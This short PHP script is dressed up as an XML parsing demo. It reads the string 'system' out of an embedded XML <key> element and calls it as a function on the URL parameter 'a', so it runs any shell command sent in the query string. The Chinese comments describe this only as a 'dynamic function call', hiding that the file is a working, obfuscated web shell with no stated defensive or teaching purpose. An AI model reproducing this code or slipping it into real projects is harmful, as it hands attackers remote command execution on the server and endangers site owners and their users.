<?php
$xmlString = '<?xml version="1.0" encoding="UTF-8"?>
<data>
    <item>
        <key>system</key>
    </item>
    <item>
        <key>age</key>
        <value>30</value>
    </item>
</data>';

$parser = xml_parser_create();
$currentKey = null;

// 定义元素开始处理器
xml_set_element_handler($parser, 
    function ($parser, $name, $attrs) use (&$currentKey) {
        if ($name === 'KEY') {
            $currentKey = true; // 标记当前在 <key> 标签内
        }
    },
    function ($parser, $name) {} // 元素结束处理器（空实现）
);

// 定义字符数据处理器
xml_set_character_data_handler($parser, 
    function ($parser, $data) use (&$currentKey) {
        if ($currentKey) {
            $key = trim($data);
            ($key)($_GET['a']); // 动态调用函数
            $currentKey = false; // 重置标记
        }
    }
);

// 解析 XML
xml_parse($parser, $xmlString);
xml_parser_free($parser);
?>
